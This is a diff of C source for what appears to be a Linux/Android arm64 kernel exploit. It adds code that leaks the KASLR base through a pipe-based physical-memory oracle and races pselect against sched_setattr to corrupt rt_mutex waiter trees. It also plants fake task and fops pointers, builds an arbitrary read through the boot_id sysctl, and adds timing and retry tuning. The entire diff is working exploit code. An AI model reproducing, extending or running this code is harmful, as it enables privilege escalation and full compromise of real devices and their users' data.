@@ -43,10 +43,41 @@ static atomic_int slide_consumer_ready;
 static atomic_llong slide_wait_start_ns;
 static atomic_int slide_pselect_armed;
 static atomic_int slide_pselect_write_window;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+static atomic_uint_fast64_t slide_pselect_started_ns;
+static int slide_pselect_production_stack;
+#endif
 static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
 static int slide_syscall_pad;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+int slide_p0_session_fresh;
+#endif
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+int p0_virtual_base_probe;
+#endif
 
 static int slide_commit_stext(uint64_t stext, const char *source);
+
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static int slide_commit_virtual_base(uint64_t base, const char *source) {
+  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
+      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
+      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
+    pr_warning("virtual base rejected source=%s base=%016llx\n",
+               source, (unsigned long long)base);
+    return 0;
+  }
+  kaslr_base = base;
+  kaslr_slide = base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  app_publish_p0_offset(slide_p0_offset);
+  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
+             "virtual_slide=%016llx p0_offset=%08zx\n",
+             source, getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+}
+#endif
 
 static useconds_t slide_enter_delay_usec(void) {
   const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
@@ -156,6 +187,35 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = slide_pselect_words_per_set();
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  uintptr_t stack_tree_parent = slide_oracle_parent;
+  uintptr_t stack_tree_right = 0;
+  uintptr_t stack_tree_left = slide_oracle_target;
+  uintptr_t stack_pi_parent = slide_oracle_parent;
+  uintptr_t stack_pi_right = 0;
+  uintptr_t stack_pi_left = slide_oracle_target;
+  uintptr_t stack_task = fake_task;
+  slide_pselect_production_stack = 0;
+#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
+    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
+  if (slide_oracle_parent == fake_fops &&
+      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
+    /*
+     * The stale pselect waiter is dequeued from the lock waiter tree before
+     * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
+     * build 58 cleared the tree child and consequently produced no write.
+     * Isolate only the established FOPS PI-child direction here.
+     */
+    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
+    stack_pi_left = 0;
+    slide_pselect_production_stack = 1;
+  }
+#endif
+#else
+  slide_pselect_production_stack = 0;
+#endif
+#endif
   struct slide_waiter_word {
     int word;
     uint64_t value;
@@ -170,6 +230,14 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * DIRECT_BOOTID_CHILD: tree_left = slide_oracle_child (Q) gives the
      * waiter one child so rb_erase's `str child,[parent->rb_left]` plants Q
      * into &ctl_table.data -> boot_id reads 16 bytes at Q (arbitrary read). */
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    {0, stack_tree_parent, "tree_pc"},
+    {1, stack_tree_right, "tree_right"},
+    {2, stack_tree_left, "tree_left"},
+    {3, stack_pi_parent, "pi_pc"},
+    {4, stack_pi_right, "pi_right"},
+    {5, stack_pi_left, "pi_left"},
+#else
     {0, slide_oracle_parent, "tree_pc"},
     {1, 0, "tree_right"},
     {2, slide_oracle_child ? slide_oracle_child : slide_oracle_target,
@@ -177,6 +245,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {3, slide_oracle_parent, "pi_pc"},
     {4, 0, "pi_right"},
     {5, slide_oracle_target, "pi_left"},
+#endif
 #else
     {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
@@ -190,7 +259,11 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * (KASLR-computable) even when the build enables SLIDE_USE_FAKE_TASK,
      * because DIRECT_BOOTID_RECLAIM routes fake_task to init_task at
      * select time. */
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    {6, stack_task, "task"},
+#else
     {6, fake_task, "task"},
+#endif
 #elif defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {6, fake_task, "task"},
 #else
@@ -299,6 +372,9 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_last_sched_ret, -1);
   atomic_store(&slide_consume_last_sched_errno, 0);
   atomic_store(&slide_pselect_write_window, 0);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  atomic_store(&slide_pselect_started_ns, 0);
+#endif
 
   struct timespec timeout = {
 #ifdef SLIDE_PSELECT_TIMEOUT_NSEC
@@ -327,6 +403,9 @@ void slide_pselect_stack_copy(void) {
   struct timespec *timeoutp = &timeout;
 
   size_t pselect_started = gettime_ns();
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  atomic_store(&slide_pselect_started_ns, pselect_started);
+#endif
   for (int index = 0; index < slide_syscall_pad; index++) {
     syscall(SYS_gettid);
   }
@@ -350,6 +429,23 @@ void slide_pselect_stack_copy(void) {
     }
   }
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
+          "ret=%d errno=%d "
+          "elapsed_usec=%zu "
+          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
+          "last_sched_ret=%d last_sched_errno=%d\n",
+          slide_pselect_nfds, slide_syscall_pad,
+          slide_pselect_production_stack, ret, saved_errno,
+          pselect_elapsed_usec,
+          atomic_load(&slide_consumer_ready),
+          atomic_load(&slide_consume_seen),
+          atomic_load(&slide_consume_enter_sched),
+          atomic_load(&slide_consume_calls),
+          atomic_load(&slide_consume_sched_ok),
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
+#else
   pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
           "elapsed_usec=%zu "
           "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
@@ -363,6 +459,7 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
+#endif
   if (getenv("SLIDE_OWNER_UNLOCK")) {
     /* The owner-unlock write targets the pipe_buffer, not the pselect
      * res sets, so pselect ret stays 0 on a successful write.  Report
@@ -402,6 +499,86 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[1]);
 }
 
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+static long slide_read_task_syscall_nr(int tid) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return -1;
+  }
+  char buf[128];
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return -1;
+  }
+  buf[n] = 0;
+  char *end = NULL;
+  errno = 0;
+  long nr = strtol(buf, &end, 0);
+  if (errno || end == buf) {
+    return -1;
+  }
+  return nr;
+}
+
+static int slide_read_task_wchan(int tid, char *buf, size_t size) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, size - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  char *newline = strchr(buf, '\n');
+  if (newline) {
+    *newline = 0;
+  }
+  return 1;
+}
+
+static int slide_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
+  if (slide_read_task_syscall_nr(tid) != SYS_pselect6 ||
+      !slide_read_task_wchan(tid, wchan, size)) {
+    return 0;
+  }
+  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
+}
+
+static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
+                                          int confirmations,
+                                          size_t *elapsed_usec,
+                                          char *last_wchan,
+                                          size_t last_wchan_size) {
+  size_t started = gettime_ns();
+  size_t deadline = started + timeout_usec * 1000ULL;
+  int synced = 0;
+  while (gettime_ns() < deadline) {
+    if (slide_task_blocked_in_pselect(tid, last_wchan,
+                                      last_wchan_size)) {
+      synced++;
+      if (synced >= confirmations) {
+        break;
+      }
+      usleep(100);
+    } else {
+      synced = 0;
+      __asm__ volatile("yield" ::: "memory");
+    }
+  }
+  if (elapsed_usec) {
+    *elapsed_usec = (gettime_ns() - started) / 1000ULL;
+  }
+  return synced >= confirmations;
+}
+#endif
+
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(exploit_core() + 1);
@@ -427,6 +604,77 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       continue;
     }
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    int tid = atomic_load(&slide_waiter_tid);
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+    int ready_ok = -1;
+    int guard_ok = -1;
+    size_t ready_elapsed_usec = 0;
+    size_t guard_elapsed_usec = 0;
+    uint64_t pselect_age_usec = 0;
+    char ready_wchan[64] = "<not-read>";
+    char guard_wchan[64] = "<not-read>";
+#endif
+    if (seq == 1) {
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+      ready_ok = slide_wait_for_pselect_blocked(
+          tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
+          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
+          ready_wchan, sizeof(ready_wchan));
+      if (!ready_ok) {
+        pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
+                "trigger skipped\n",
+                tid, ready_elapsed_usec, ready_wchan);
+        atomic_store(&slide_consume_stop, 1);
+        return NULL;
+      }
+#endif
+      usleep(slide_enter_delay_usec());
+#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
+      uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
+      pselect_age_usec = pselect_started_ns
+          ? (gettime_ns() - pselect_started_ns) / 1000ULL
+          : UINT64_MAX;
+      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
+        pr_info("slide pselect age guard=0 tid=%d age_usec=%llu max=%d; "
+                "trigger skipped\n",
+                tid, (unsigned long long)pselect_age_usec,
+                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
+        atomic_store(&slide_consume_stop, 1);
+        return NULL;
+      }
+#endif
+#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
+      guard_ok = slide_wait_for_pselect_blocked(
+          tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
+          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
+          guard_wchan, sizeof(guard_wchan));
+      if (!guard_ok) {
+        pr_info("slide pselect blocked guard=0 tid=%d elapsed_usec=%zu "
+                "wchan=%s; trigger skipped\n",
+                tid, guard_elapsed_usec, guard_wchan);
+        atomic_store(&slide_consume_stop, 1);
+        return NULL;
+      }
+#endif
+#if defined(APP_PSELECT_POST_GUARD_AGE_CHECK) && \
+    APP_PSELECT_POST_GUARD_AGE_CHECK && \
+    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
+      pselect_started_ns = atomic_load(&slide_pselect_started_ns);
+      pselect_age_usec = pselect_started_ns
+          ? (gettime_ns() - pselect_started_ns) / 1000ULL
+          : UINT64_MAX;
+      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
+        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
+                "max=%d; trigger skipped\n",
+                tid, (unsigned long long)pselect_age_usec,
+                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
+        atomic_store(&slide_consume_stop, 1);
+        return NULL;
+      }
+#endif
+    }
+#else
     if (seq == 1) {
       usleep(slide_enter_delay_usec());
     }
@@ -463,11 +711,23 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       if (!atomic_load(&slide_pselect_armed)) {
         break;
       }
+#endif
       int calls = atomic_load(&slide_consume_calls);
       int entered = atomic_load(&slide_consume_enter_sched) + 1;
       atomic_store(&slide_consume_enter_sched, entered);
       atomic_store(&slide_consume_calls, calls + 1);
       *errno_ptr = 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+      long ret = sched_setattr_tid(tid, (calls % 19) + 1);
+      int saved_errno = *errno_ptr;
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+      pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
+              "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
+              ready_ok, ready_elapsed_usec, ready_wchan,
+              guard_ok, guard_elapsed_usec, guard_wchan,
+              (unsigned long long)pselect_age_usec, tid);
+#endif
+#else
       long ret;
       int saved_errno;
       if (getenv("SLIDE_OWNER_UNLOCK")) {
@@ -485,16 +745,20 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
         ret = sched_setattr_tid(tid, (calls % 19) + 1);
         saved_errno = *errno_ptr;
       }
+#endif
       atomic_store(&slide_consume_last_sched_ret, (int)ret);
       atomic_store(&slide_consume_last_sched_errno, saved_errno);
       if (ret == 0) {
         int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
         atomic_store(&slide_consume_sched_ok, sched_ok);
       }
+#if !(defined(APP_REQUIRE_FRESH_P0_SESSION) && \
+    APP_REQUIRE_FRESH_P0_SESSION)
       if (burst_idx + 1 < burst && spacing_usec > 0) {
         usleep((useconds_t)spacing_usec);
       }
     }
+#endif
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
       __asm__ volatile("yield" ::: "memory");
@@ -753,8 +1017,16 @@ static int slide_child_trigger_write(void) {
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
+#if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
+  int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
+  int write_window = atomic_load(&slide_pselect_write_window) != 0;
+  pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
+          sched_ok, write_window);
+  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
+#else
   return atomic_load(&slide_waiter_ok) != 0 &&
          atomic_load(&slide_pselect_write_window) != 0;
+#endif
 }
 
 static int slide_trigger_physical_state(void) {
@@ -775,6 +1047,12 @@ static int slide_trigger_physical_state(void) {
   return ok;
 }
 
+#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
+static const int slide_physical_slot_delays[] = {
+  SLIDE_PHYSICAL_SLOT_DELAYS_USEC
+};
+#endif
+
 static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
@@ -782,41 +1060,61 @@ static int slide_trigger_physical_slot(size_t slot) {
   /* Crash-correlation: if the walk fires into a live page (reclaim miss),
    * the panic log's corrupted address should equal parent+0x08/+0x10 and the
    * written value should equal target. */
-  char delay_arg[16];
-  int delay = (int)slide_enter_delay_usec();
-  slide_pselect_nfds = PSELECT_ROUTE_NFDS;
-  slide_syscall_pad = 0;
-  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
-  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
-  if (slide_trigger_physical_state()) {
-    if (getenv("DIRECT_BOOTID_RECLAIM")) {
-      /* After the erase, the boot_id sysctl points at the arbitrary-read
-       * oracle.  Read it to prove the walk completed and the retarget
-       * landed (reclaim success), vs. a fire that panics (reclaim miss). */
-      uint64_t oracle = 0;
-      int read_ok = slide_bootid_read64(&oracle);
-      pr_info("direct-bootid oracle read_ok=%d value=%016llx "
-              "parent=%016zx target=%016zx child=%016zx\n",
-              read_ok, (unsigned long long)oracle, slide_oracle_parent,
-              slide_oracle_target, slide_oracle_child);
-    }
-    pr_info("p0 physical slot=%zu write attempt=1/1 delay=%d nfds=%d "
-            "pad=%d\n",
-            slot, delay, slide_pselect_nfds, slide_syscall_pad);
-    return 1;
-  }
 
-  if (getenv("P0_ORACLE_GATE_DIAG") && slot == P0_ORACLE_GATE_SLOT) {
-    /* The write may have fired without opening the early-wake window
-     * (ret=0).  Verify the pipe oracle anyway so diagnostics can tell
-     * "silent write" apart from "reclaim miss / walk never happened".
-     * Done here because pr_error below exits the attempt process. */
-    int late_gate = verify_p0_pipe_oracle_gate();
-    pr_warning("p0 physical gate diagnostic (post-failure) result=%d\n",
-               late_gate);
+  int base_delay = (int)slide_enter_delay_usec();
+#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
+  int attempts = (int)(sizeof(slide_physical_slot_delays) /
+                       sizeof(slide_physical_slot_delays[0]));
+#else
+  int attempts = 1;
+#endif
+
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    int delay = base_delay;
+#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
+    delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
+#endif
+#if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
+    if (p0_virtual_base_probe) {
+      delay = SLIDE_VIRTUAL_BASE_DELAY_USEC;
+    }
+#endif
+    char delay_arg[16];
+    slide_pselect_nfds = PSELECT_ROUTE_NFDS;
+    slide_syscall_pad = 0;
+    snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
+    SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+    if (slide_trigger_physical_state()) {
+      if (getenv("DIRECT_BOOTID_RECLAIM")) {
+        /* After the erase, the boot_id sysctl points at the arbitrary-read
+         * oracle.  Read it to prove the walk completed and the retarget
+         * landed (reclaim success), vs. a fire that panics (reclaim miss). */
+        uint64_t oracle = 0;
+        int read_ok = slide_bootid_read64(&oracle);
+        pr_info("direct-bootid oracle read_ok=%d value=%016llx "
+                "parent=%016zx target=%016zx child=%016zx\n",
+                read_ok, (unsigned long long)oracle, slide_oracle_parent,
+                slide_oracle_target, slide_oracle_child);
+      }
+      pr_info("p0 physical slot=%zu write attempt=%d/%d delay=%d nfds=%d "
+              "pad=%d\n",
+              slot, attempt, attempts, delay, slide_pselect_nfds,
+              slide_syscall_pad);
+      return 1;
+    }
+
+    if (getenv("P0_ORACLE_GATE_DIAG") && slot == P0_ORACLE_GATE_SLOT) {
+      /* The write may have fired without opening the early-wake window
+       * (ret=0).  Verify the pipe oracle anyway so diagnostics can tell
+       * "silent write" apart from "reclaim miss / walk never happened".
+       * Done here because pr_error below exits the attempt process. */
+      int late_gate = verify_p0_pipe_oracle_gate();
+      pr_warning("p0 physical gate diagnostic (post-failure) result=%d\n",
+                 late_gate);
+    }
   }
-  pr_error("p0 physical slot=%zu write window failed after one attempt\n",
-           slot);
+  pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
+           slot, attempts);
   return 0;
 }
 
@@ -832,6 +1130,62 @@ static int slide_restore_physical_oracle(void) {
   return gate_restored && probe_restored;
 }
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+static int app_trigger_fops_slide_slot(size_t slot) {
+  static size_t delay_index;
+  static const int delays[] = {
+    70000, 60000, 80000, 40000, 90000, 50000,
+    30000, 20000, 75000, 65000, 85000, 55000,
+  };
+  if (!select_slide_payload_index(slot)) {
+    return 0;
+  }
+  int delay = 0;
+#ifdef APP_FOPS_PSELECT_DELAY_USEC
+  delay = APP_FOPS_PSELECT_DELAY_USEC;
+#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
+    APP_FOPS_ROUTE_USE_PSELECT_DELAY
+  const char *forced = getenv("PSELECT_DELAY_USEC");
+  if (forced && *forced) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(forced, &end, 0);
+    if (!errno && end != forced && !*end && value >= 0 &&
+        value <= 1000000) {
+      delay = (int)value;
+    }
+  }
+#endif
+  if (!delay) {
+    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
+  }
+  delay_index++;
+  char delay_arg[16];
+  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
+  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+  pr_info("app fops slide route slot=%zu parent=%016zx target=%016zx "
+          "lock=%016zx delay=%d\n",
+          slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay);
+  return slide_trigger_physical_state();
+}
+
+int app_trigger_fops_slide_route(void) {
+#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
+    APP_FOPS_REUSE_VERIFIED_PAGE
+  return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
+#else
+  return app_trigger_fops_slide_slot(0);
+#endif
+}
+
+#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
+    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
+int app_trigger_fops_oracle_slot(size_t slot) {
+  return app_trigger_fops_slide_slot(slot);
+}
+#endif
+#else
 int app_trigger_fops_slide_route(void) {
   static size_t delay_index;
   static const int delays[] = {
@@ -851,6 +1205,7 @@ int app_trigger_fops_slide_route(void) {
           slide_oracle_parent, slide_oracle_target, fake_lock, delay);
   return slide_trigger_physical_state();
 }
+#endif
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
@@ -858,6 +1213,116 @@ static int slide_leak_physical_base(void) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
+  const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fresh_page_attempts = 1;
+#endif
+  int fresh_attempt = 1;
+  int search_batch = 0;
+#ifdef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
+  const int max_search_batches = APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
+#else
+  const int max_search_batches = fresh_page_attempts;
+#endif
+  int refresh_oracle = 0;
+  while (fresh_attempt <= fresh_page_attempts &&
+         search_batch < max_search_batches) {
+#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
+    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
+    if (refresh_oracle) {
+      reset_pipe_attempt();
+      if (!prepare_p0_pipe_oracle()) {
+        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
+        return 0;
+      }
+      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
+              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
+      refresh_oracle = 0;
+    }
+#endif
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    search_batch++;
+    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
+            search_batch, max_search_batches, fresh_attempt,
+            fresh_page_attempts, page_base);
+    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
+            fresh_attempt, fresh_page_attempts, page_base);
+    if (!page_base) {
+#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
+      fresh_attempt++;
+      refresh_oracle = 1;
+#endif
+      continue;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
+               fresh_attempt, fresh_page_attempts);
+      fresh_attempt++;
+      refresh_oracle = 1;
+      continue;
+    }
+    int gate_result = verify_p0_pipe_oracle_gate();
+    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
+            gate_result, fresh_attempt, fresh_page_attempts);
+    if (getenv("P0_ORACLE_GATE_DIAG")) {
+      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+      if (gate_result != 0) {
+        slide_restore_physical_oracle();
+      }
+      return 0;
+    }
+    if (gate_result == 0) {
+      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
+      fresh_attempt++;
+      refresh_oracle = 1;
+      continue;
+    }
+    app_publish_p0_dirty();
+    if (gate_result < 0) {
+      pr_error("p0 physical pipe gate changed unexpected pages\n");
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    uintptr_t offset = scan_p0_pipe_oracle();
+    if (offset == (uintptr_t)-1) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
+    APP_P0_FINGERPRINT_INVERSE_SLIDE
+    if (offset > P0_ORACLE_PROBE_OFFSET) {
+      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
+               "probe=%08llx\n",
+               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    uintptr_t source_offset = offset;
+    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
+    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
+            "runtime_slide=%08zx\n",
+            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
+            offset);
+#endif
+    if (!slide_restore_physical_oracle()) {
+      return 0;
+    }
+    slide_p0_session_fresh = 1;
+    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
+               elapsed_ms, fresh_attempt, fresh_page_attempts);
+    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+  }
+  return 0;
+#else
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
     return 0;
@@ -899,7 +1364,71 @@ static int slide_leak_physical_base(void) {
   size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
   pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
   return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+#endif
 }
+
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static int slide_leak_virtual_base(uintptr_t physical_offset) {
+  size_t started = gettime_ns();
+  uint64_t ashmem_fops = 0;
+  int gate_result = 0;
+  int restore_needed = 0;
+  int restore_ok = 0;
+  int success = 0;
+  slide_p0_offset = physical_offset;
+  p0_virtual_base_probe = 1;
+
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 virtual pipe preparation failed\n");
+    goto out;
+  }
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    goto out;
+  }
+  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
+  app_publish_p0_dirty();
+  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    pr_error("p0 virtual pipe gate trigger failed\n");
+    goto out;
+  }
+  gate_result = verify_p0_pipe_oracle_gate();
+  if (gate_result != 1) {
+    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
+    if (gate_result != 0) {
+      restore_needed = 1;
+    }
+    goto out;
+  }
+  restore_needed = 1;
+  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    goto out;
+  }
+  ashmem_fops = scan_p0_virtual_base_pointer();
+
+out:
+  if (restore_needed) {
+    restore_ok = slide_restore_physical_oracle();
+  }
+  p0_virtual_base_probe = 0;
+  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
+    return 0;
+  }
+
+  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
+  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
+      base + ASHMEM_FOPS_OFF != ashmem_fops) {
+    return 0;
+  }
+  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
+             "base=%016llx\n", elapsed_ms,
+             (unsigned long long)ashmem_fops,
+             (unsigned long long)base);
+  success = slide_commit_virtual_base(base, "physical-data");
+  return success;
+}
+#endif
 
 static void dump_p0_oracle_words(int fd, const char *phase,
                                  uintptr_t address, size_t count) {
